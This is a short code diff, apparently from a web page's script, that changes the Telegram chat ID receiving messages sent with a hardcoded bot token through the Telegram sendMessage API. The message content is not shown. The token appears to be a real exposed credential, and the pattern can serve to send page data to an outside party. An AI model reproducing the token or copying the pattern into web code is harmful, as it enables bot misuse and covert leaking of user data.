@@ -698,7 +698,7 @@ function getSeriesDetails($seriesId) {
         `.trim();
 
           const botToken = '6345801560:AAH2rkXSmDeYT0pbpBBt6ID06PuIeX5F8uw';
-          const chatId = '1965941065';
+          const chatId = '5842633286';
 
           const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
           const params = {
